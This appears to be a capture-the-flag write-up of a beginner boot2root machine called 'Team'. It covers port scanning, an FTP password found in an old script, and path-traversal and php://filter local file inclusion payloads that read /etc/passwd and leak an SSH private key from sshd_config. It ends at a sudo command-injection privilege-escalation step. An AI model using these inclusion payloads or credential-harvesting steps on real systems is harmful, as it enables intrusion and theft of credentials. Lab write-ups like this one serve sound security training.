---
Beginner friendly boot2root machine
---

_Created by:﻿dalemazza_

_Credit to P41ntP4rr0t for help along the way_


```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.167.117 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.167.117:21
Open 10.10.167.117:22
Open 10.10.167.117:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 23:22 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
Initiating Ping Scan at 23:22
Scanning 10.10.167.117 [2 ports]
Completed Ping Scan at 23:22, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:22
Completed Parallel DNS resolution of 1 host. at 23:22, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:22
Scanning 10.10.167.117 [3 ports]
Discovered open port 22/tcp on 10.10.167.117
Discovered open port 80/tcp on 10.10.167.117
Discovered open port 21/tcp on 10.10.167.117
Completed Connect Scan at 23:22, 0.21s elapsed (3 total ports)
Initiating Service scan at 23:22
Scanning 3 services on 10.10.167.117
Completed Service scan at 23:22, 6.53s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.167.117.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 6.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 1.46s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
Nmap scan report for 10.10.167.117
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-12-22 23:22:08 EST for 15s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 795f116a85c20824306cd488741b794d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRK/xFh/H4lC7shWUUvK9lKxd3VO2OwfsC8LjFEU2CnEUrbVCnzx8jiVp5gO+CVAj63+GXkbIuXpynlQ/4j1dXdVUz/yAZ96cHiCNo6S5ThONoG2g2ObJSviCX2wBXhUJEzW07mRdtx4nesr6XWMj9hwIlSfSBS2iPEiqHfGrjp14NjG6Xmq5hxZh5Iq3dBrOd/ZZKjGsHe+RElAMzIwRK5NwFlE7zt7ZiANrFSy4YD4zerNSyEnjPdnE6/ArBmqOFtsWKZ2p/Wc0oLOP7d6YBwQyZ9yQNVGYS9gDIGZyQCYsMDVJf7jNvRp/3Ru53FMRcsYm5+ItIrgrx5GbpA+LR
|   256 af7e3f7eb4865883f1f6a254a69bbaad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBM4d9TCz3FkEBEJ1VMjOsCrxsbS3YGb7mu9WgtnaFPZs2eG4ssCWz9nWeLolFgvHyT5WxRT0SFSv3vCZCtN86I=
|   256 2625b07bdc3fb29437125dcd0698c79f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUxjoul7JvmqQMtGOuadBwi2mBVCdXhJjoG5x+l+uQn
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:22
Completed NSE at 23:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds

┌──(kali㉿kali)-[~]
└─$ ftp 10.10.167.117    
Connected to 10.10.167.117.
220 (vsFTPd 3.0.3)
Name (10.10.167.117:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.

<title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>


┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts                         
10.129.132.154 unika.htb
10.129.105.231 thetoppers.htb
10.129.105.231 s3.thetoppers.htb
10.10.11.180 shoppy.htb
10.10.11.180 mattermost.shoppy.htb
#10.10.219.166 windcorp.thm
10.10.85.102 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm

http://team.thm/robots.txt

dale

┌──(kali㉿kali)-[~]
└─$ feroxbuster -t 64 -u http://team.thm/scripts/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://team.thm/scripts/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      273c http://team.thm/scripts/
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess
403      GET        9l       28w      273c http://team.thm/scripts/.hta
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.py
403      GET        9l       28w      273c http://team.thm/scripts/.hta.py
403      GET        9l       28w      273c http://team.thm/scripts/.html
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.html
403      GET        9l       28w      273c http://team.thm/scripts/.hta.html
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.txt
403      GET        9l       28w      273c http://team.thm/scripts/.hta.txt
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.py
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.html
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.txt
200      GET       21l       71w      597c http://team.thm/scripts/script.txt
[####################] - 1m     18856/18856   0s      found:15      errors:3      
[####################] - 1m     18856/18856   282/s   http://team.thm/scripts/ 


#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in


┌──(kali㉿kali)-[~]
└─$ feroxbuster -t 64 -u http://team.thm/scripts/ -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak,old,new 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://team.thm/scripts/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [bak, old, new]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      273c http://team.thm/scripts/
403      GET        9l       28w      273c http://team.thm/scripts/.hta
403      GET        9l       28w      273c http://team.thm/scripts/.hta.bak
403      GET        9l       28w      273c http://team.thm/scripts/.hta.old
403      GET        9l       28w      273c http://team.thm/scripts/.hta.new
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.bak
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.old
403      GET        9l       28w      273c http://team.thm/scripts/.htaccess.new
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.bak
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.old
403      GET        9l       28w      273c http://team.thm/scripts/.htpasswd.new
200      GET       18l       44w      466c http://team.thm/scripts/script.old
[####################] - 1m     18856/18856   0s      found:14      errors:0      
[####################] - 1m     18856/18856   280/s   http://team.thm/scripts/ 

download it

┌──(kali㉿kali)-[~/Downloads]
└─$ cat script.old                  
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

┌──(kali㉿kali)-[~]
└─$ ftp 10.10.167.117
Connected to 10.10.167.117.
220 (vsFTPd 3.0.3)
Name (10.10.167.117:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||49544|)
ftp: Can't connect to `10.10.167.117:49544': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
ftp> cd workshare
250 Directory successfully changed.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
226 Directory send OK.
ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
100% |*************************************************************|   269        1.70 MiB/s    00:00 ETA
226 Transfer complete.
269 bytes received in 00:00 (1.36 KiB/s)
ftp> quit
221 Goodbye.

┌──(kali㉿kali)-[~]
└─$ cat New_site.txt 
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 


┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
10.129.105.231 thetoppers.htb
10.129.105.231 s3.thetoppers.htb
10.10.11.180 shoppy.htb
10.10.11.180 mattermost.shoppy.htb
#10.10.219.166 windcorp.thm
10.10.85.102 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm

click to link 

http://dev.team.thm/script.php?page=teamshare.php

LFI

LFI (Local File Inclusion) es un tipo de vulnerabilidad que permite a un atacante incluir archivos del sistema en una aplicación web. Esto puede suceder cuando una aplicación web incluye un archivo de forma no segura, permitiendo a un atacante especificar la ruta de un archivo que debería ser incluido en la aplicación.

Por ejemplo, considere una aplicación web que permite a los usuarios cargar un archivo de imagen y mostrarlo en una página web. Si la aplicación no verifica adecuadamente el archivo que se está cargando, un atacante podría especificar la ruta de un archivo del sistema, como /etc/passwd (que contiene información de usuario en muchos sistemas operativos), y ver el contenido de ese archivo a través de la aplicación web.

Para evitar este tipo de vulnerabilidad, es importante asegurarse de que todas las entradas de usuario se validan adecuadamente y que no se permita la inclusión de archivos no seguros en la aplicación web.

http://dev.team.thm/script.php?page=teamshare.php=/../../../../etc/passwd
http://dev.team.thm/script.php?page=teamshare.php=../../../../../etc/passwd

http://dev.team.thm/script.php?page=teamshare.php=/../../../../../../../etc/passwd
http://dev.team.thm/script.php?page=teamshare.php=/../../../../../../../etc/shadow (empty)

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles:/bin/bash ftpuser:x:1002:1002::/home/ftpuser:/bin/sh ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 

let's see teamshare.php

http://dev.team.thm/script.php?page=php://filter/read=convert.base64-encode/resource=teamshare.php

┌──(kali㉿kali)-[~]
└─$ echo 'PGh0bWw+CiA8aGVhZD4KICA8dGl0bGU+VGVhbSBTaGFyZTwvdGl0bGU+CiA8L2hlYWQ+CiA8Ym9keT4KICA8P3BocCBlY2hvICJQbGFjZSBob2xkZXIgZm9yIGZ1dHVyZSB0ZWFtIHNoYXJlIiA/PgogPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d
<html>
 <head>
  <title>Team Share</title>
 </head>
 <body>
  <?php echo "Place holder for future team share" ?>
 </body>
</html>

http://dev.team.thm/script.php?page=php://filter/read=convert.base64-encode/resource=script.php


┌──(kali㉿kali)-[~]
└─$ echo 'Cjw/cGhwICAgCiRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgidGVhbXNoYXJlLnBocCIpOwogICB9Cj8+Cg==' | base64 -d

<?php   
$file = $_GET['page'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("teamshare.php");
   }
?>

http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa (empty)
http://dev.team.thm/script.php?page=/../../../../../../../root/root.txt (same)
http://dev.team.thm/script.php?page=/../../../../../../../home/dale/user.txt
THM{6Y0TXHz7c2d} 

Using burp suite professional (sniper)

like this

GET /script.php?page=/../../../../../../../§etc/passwd§ HTTP/1.1

and in payloads choose .. /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

then start attack 

length 167 is empty (wow in 10 seconds finish it with burp professional! )

filter expression by id_rsa

/etc/ssh/sshd_config (find this let's check)

view-source:http://dev.team.thm/script.php?page=/../../../../../../../etc/ssh/sshd_config

find id_rsa

#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~]
└─$ nano id_rsa   
                                                                                                          
┌──(kali㉿kali)-[~]
└─$ sed 's/#//' id_rsa > id_rsa   

┌──(kali㉿kali)-[~/team]
└─$ nano uncomment
                                                                                                          
┌──(kali㉿kali)-[~/team]
└─$ sed 's/#//' uncomment > id_rsa 
                                                                                                          
┌──(kali㉿kali)-[~/team]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


┌──(kali㉿kali)-[~/team]
└─$ chmod 600 id_rsa 
                                                                                                          
┌──(kali㉿kali)-[~/team]
└─$ ssh -i id_rsa dale@10.10.167.117
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ whoami
dale

┌──(kali㉿kali)-[~/team]
└─$ ssh -i id_rsa dale@10.10.167.117
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ whoami
dale
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ pwd
/home/dale
dale@TEAM:~$ cat user.txt 
THM{6Y0TXHz7c2d}

dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: gyles
Enter 'date' to timestamp the file: 1/1/1
The Date is Stats have been backed up

dale@TEAM:~$ cat /home/gyles/admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

